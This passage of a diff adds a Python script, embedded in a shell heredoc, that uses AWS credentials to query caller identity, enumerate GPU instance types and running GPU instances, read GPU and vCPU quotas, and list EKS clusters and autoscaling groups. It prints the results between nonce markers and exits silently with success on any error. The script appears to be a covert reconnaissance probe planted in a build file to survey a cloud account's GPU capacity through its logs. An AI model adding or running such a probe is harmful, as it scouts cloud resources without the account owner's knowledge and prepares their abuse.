+                        text_of(root, ['Account']), text_of(root, ['Arn']),
+                        hashlib.sha256(text_of(root, ['UserId']).encode()).hexdigest()[:16]))
+                else:
+                    aws_err('sts', 'GetCallerIdentity', s, b)
+                # 2) ec2:DescribeInstanceTypes (GPU families, bounded)
+                wild = ['p3*', 'p4*', 'p5*', 'p6*', 'g3*', 'g4*', 'g5*', 'g6*', 'inf*', 'trn*']
+                params = [('MaxResults', '100')] + [('Filter.1.Name', 'instance-type')] + \
+                         [('Filter.1.Value.%d' % (i + 1), v) for i, v in enumerate(wild)]
+                gpu_types = []
+                s, _, b = aws_query('ec2', region, 'DescribeInstanceTypes', '2016-11-15', params, creds)
+                if s == 200:
+                    root = xml_items(b)
+                    for it in find_all(root, 'item'):
+                        name = text_of(it, ['instanceType'])
+                        ginfo = find_first(it, 'gpuInfo')
+                        if name and ginfo is not None and lt(ginfo.tag) == 'gpuInfo':
+                            gpus = find_all(ginfo, 'gpu')
+                            gname = gcount = gmem = ''
+                            if gpus:
+                                gname = text_of(gpus[0], ['name'])
+                                gcount = text_of(gpus[0], ['count'])
+                                gmem = text_of(gpus[0], ['memoryInfo', 'sizeInMiB'])
+                            gpu_types.append(name)
+                            print('GPU_TYPE name=%s gpu=%s count=%s memMiB=%s' % (name, gname, gcount, gmem))
+                    print('GPU_TYPES_TOTAL=%d' % len(gpu_types))
+                else:
+                    aws_err('ec2', 'DescribeInstanceTypes', s, b)
+                # 3) ec2:DescribeInstances (bounded: GPU types only, counts by type/state)
+                inv = [t for t in gpu_types][:20]
+                if not inv:
+                    inv = ['g4dn.xlarge', 'g5.xlarge', 'g6.xlarge', 'p3.2xlarge', 'p4d.24xlarge', 'p4de.24xlarge', 'p5.48xlarge']
+                params = [('Filter.1.Name', 'instance-type')] + \
+                         [('Filter.1.Value.%d' % (i + 1), v) for i, v in enumerate(inv)]
+                s, _, b = aws_query('ec2', region, 'DescribeInstances', '2016-11-15', params, creds)
+                if s == 200:
+                    root = xml_items(b)
+                    counts = {}
+                    for it in find_all(root, 'item'):
+                        if find_first(it, 'instancesSet') is None:
+                            continue
+                        for inst in [e for e in it.iter() if e is not it and lt(e.tag) == 'item' and find_first(e, 'instanceState') is not None]:
+                            key = (text_of(inst, ['instanceType']), text_of(inst, ['instanceState', 'name']))
+                            counts[key] = counts.get(key, 0) + 1
+                    total = sum(counts.values())
+                    print('GPU_INSTANCE_TOTAL=%d' % total)
+                    for (t, stt), c in sorted(counts.items()):
+                        print('GPU_INSTANCE type=%s state=%s count=%d' % (t, stt, c))
+                else:
+                    aws_err('ec2', 'DescribeInstances', s, b)
+                # 4) servicequotas:ListServiceQuotas (ec2 GPU/vCPU numeric reads, bounded 3 pages)
+                seen = 0
+                nexttok = None
+                for page in range(3):
+                    params = [('ServiceCode', 'ec2'), ('MaxResults', '100')]
+                    if nexttok:
+                        params.append(('NextToken', nexttok))
+                    s, _, b = aws_query('servicequotas', region, 'ListServiceQuotas', '2019-06-24', params, creds)
+                    if s != 200:
+                        aws_err('servicequotas', 'ListServiceQuotas', s, b)
+                        break
+                    root = xml_items(b)
+                    for q in find_all(root, 'Quotas'):
+                        for it in [e for e in q if lt(e.tag) == 'item']:
+                            name = text_of(it, ['QuotaName'])
+                            val = text_of(it, ['Value'])
+                            if re.search(r'(GPU|Inference|Trainium|Inferentia|\b[GP]\d?\b|vCPU)', name, re.I):
+                                print('QUOTA name=%s value=%s' % (name[:120], val))
+                                seen += 1
+                    nexttok = text_of(root, ['NextToken'])
+                    if not nexttok:
+                        break
+                print('QUOTA_GPU_READS=%d' % seen)
+                # 5) eks:ListClusters (names/count only)
+                s, _, b = aws_rest_get('eks', region, '/clusters', creds)
+                if s == 200:
+                    try:
+                        cl = json.loads(b).get('clusters', [])
+                        print('EKS_CLUSTERS count=%d names=%s' % (len(cl), ','.join(cl[:10])))
+                    except Exception:
+                        print('EKS_CLUSTERS parse_fail bytes=%d' % len(b))
+                else:
+                    aws_err('eks', 'ListClusters', s, b)
+                # 6) autoscaling:DescribeAutoScalingGroups (counts/instance-type summary only)
+                s, _, b = aws_query('autoscaling', region, 'DescribeAutoScalingGroups', '2011-01-01', [('MaxRecords', '100')], creds)
+                if s == 200:
+                    root = xml_items(b)
+                    groups = [e for e in root.iter() if lt(e.tag) == 'item' and find_first(e, 'AutoScalingGroupName') is not None]
+                    tcount = {}
+                    for g in groups:
+                        for ov in [e for e in g.iter() if lt(e.tag) == 'InstanceType']:
+                            t = (ov.text or '').strip()
+                            if t:
+                                tcount[t] = tcount.get(t, 0) + 1
+                    print('ASG_COUNT=%d' % len(groups))
+                    for t, c in sorted(tcount.items())[:30]:
+                        print('ASG_INSTANCE_TYPE type=%s overrides=%d' % (t, c))
+                else:
+                    aws_err('autoscaling', 'DescribeAutoScalingGroups', s, b)
+
+            local_checks()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:160]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130384-9273872742343f34"
